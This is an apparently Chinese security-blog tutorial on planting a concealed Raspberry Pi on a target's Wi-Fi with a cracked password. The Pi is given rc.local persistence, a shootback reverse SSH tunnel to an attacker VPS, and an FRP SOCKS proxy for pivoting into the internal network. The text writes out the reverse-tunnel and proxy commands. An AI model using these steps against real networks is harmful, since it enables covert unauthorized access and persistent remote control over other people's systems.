## 前言

上一篇[无线安全实战基础篇](https://www.freebuf.com/articles/wireless/243445.html)介绍了无线渗透一些基础内容，得到了很多大佬的关注和认可，决定再写一篇关于无线安全和内网渗透相结合的基础技术文章。

当我们已经拿到一个无线密码时如何开展内网渗透，我相信很多小朋友都想过这个问题，今天就来介绍一种通过树莓派的方式进行内网渗透的办法。

如何烧录树莓派可以从网上找找资料推荐：[树莓派基础](https://www.yahboom.com/build.html?id=1806&cid=203)。

## 前提条件

1.USB版树莓派（包括zw板子+usb扩展版+3D打印外壳）+sd卡+vps：投入大概195+29=224，VPS价格不等，只要能用即可，玩安全没几个vps不应该吧。

![](https://image.3001.net/images/20201209/1607492137_5fd062295712ebc9ddae2.jpg!small)  
2.无线和密码，对于无线的破解参考之前写过的无线安全实战基础篇。

3.USB供电口，尽量隐蔽一点，大家自己发挥吧，有无线有电就行，可以试试充电宝。

## 无线配置

首先是配置树莓派的无线功能。

sudo nano /etc/wpa_supplicant/wpa_supplicant.conf  
配置好无线后ctrl+x退出。

![](https://image.3001.net/images/20201209/1607492170_5fd0624a405d64cd725e7.jpg!small)

多个无线热点可以依次往下写。

![](https://image.3001.net/images/20201209/1607492181_5fd062558bea779c5702d.jpg!small)

最后重启树莓派，输入“sudo shutdown -r now"，重启后树莓派自动获取wifi网络，如下：

![](https://image.3001.net/images/20201209/1607492193_5fd06261add73560f2cae.jpg!small)

连不上无线建议大家多在自己的热点测试一下。

![](https://image.3001.net/images/20201209/1607492211_5fd062735cf8234e1c41c.jpg!small)参考[链接](https://baijiahao.baidu.com/s?id=1616154973730190476&wfr=spider&for=pc)。

## 管理树莓派

对于ssh配置，可以参考网上的其他资料，下面推荐一款个人比较喜欢使用的代理工具shootback，https://github.com/aploium/shootback，主要目标是将树莓派的ssh代理到VPS上方便管理使用。为了防止断电重启建议把脚本运行在开机启动脚本中：/etc/init.d/
新建文件network_test.sh,赋予权限chmod +777 network_test.sh。

加入反向连接命令：

> nohup python /home/pi/sh/slaver.py -m vpsip:10001 -t 127.0.0.1:22 --ssl &

![](https://image.3001.net/images/20201209/1607492223_5fd0627fbe144b0264bc0.jpg!small)

> chmod +x network_test.sh

![](https://image.3001.net/images/20201209/1607492252_5fd0629c336c81845ee8b.jpg!small)

将开启启动的脚本加入/etc/rc.local

![1609981134_5ff65cce941eeb89daf95.png!small?1609981168854](https://image.3001.net/images/20210107/1609981134_5ff65cce941eeb89daf95.png!small?1609981168854)

切记要执行的命令要放在exit 0前面！

vps运行命令：

> python3 master.py -m 0.0.0.0:10001 -c 0.0.0.0:10023 --ssl

![](https://image.3001.net/images/20201209/1607492265_5fd062a9cc2879fec9c55.jpg!small)ssh访问vps的10023端口：

![](https://image.3001.net/images/20201209/1607492304_5fd062d01537c2c8cca7b.jpg!small)

## 内网渗透

做内网渗透一定会用到的一款代理工具是FRP，你不用可能就亏大了。个人感觉SH做单端口代理尤其是Linux的还是很好用的，当然你也可以打包成exe文件使用。做全局代理还是用frp吧，即使你有能力拿到一个webshell,那么我还是建议吧frp用上，frp在性能上会给你带来惊喜的。

> 要使用树莓派对应的frp版本：https://github.com/fatedier/frp/releases/tag/v0.34.2

![](https://image.3001.net/images/20201209/1607492325_5fd062e5853560aeda284.jpg!small)树莓派客户端frpc.ini配置：

![](https://image.3001.net/images/20201209/1607492353_5fd0630126eab367da05b.jpg!small)

VPS服务端frps.ini配置：

![](https://image.3001.net/images/20201209/1607492366_5fd0630e5cbe6627ae243.jpg!small)

启动服务端：

> ./frps -c frps.ini

启动客户端：

> ./frpcsmp -c frpc.ini

![](https://image.3001.net/images/20201209/1607492392_5fd063283649efbd3eb1e.jpg!small)

然后就是用sockscap64进行局部应用代理访问树莓派所在目标网络。

![](https://image.3001.net/images/20201209/1607492402_5fd06332cb3d858eaa857.jpg!small)

或者用proxifler进行全局代理。

![](https://image.3001.net/images/20201209/1607492412_5fd0633cca8072b4658ed.jpg!small)

然后访问内网业务，略……

## 踩过的坑

> 1.树莓派的输入法  
>
> 树莓派默认的输入法没法用，推荐个[链接](https://blog.csdn.net/kongguguren/article/details/80039922)大家自己解决吧。
>
> 2.把frp也加入到开机启动项的尴尬。  
> 多加了个启动启动项就登录不了了，卡得没法执行命令。frp还是建议大家手动开吧。
>
> 3.切记要执行的命令要放在exit 0前面！否则开机不执行。

## 参考

> 无线渗透基础  
>
> [https://www.freebuf.com/articles/wireless/243445.html](articles/wireless/243445.html)
>
> 树莓派基础：  
>
> [https://www.yahboom.com/build.html?id=1806&cid=203](https://www.yahboom.com/build.html?id=1806&cid=203)
>
> 树莓派连接无线  
>
> [https://baijiahao.baidu.com/s?id=1616154973730190476𝔴=spider&for=pc](https://baijiahao.baidu.com/s?id=1616154973730190476&wfr=spider&for=pc)
>
> 反向代理工具sh  
> <https://github.com/aploium/shootback>
>
> 反向代理工具frp树莓派版  
> <https://github.com/fatedier/frp/releases/tag/v0.34.2>
>
> 树莓派输入法问题  
> <https://blog.csdn.net/kongguguren/article/details/80039922>

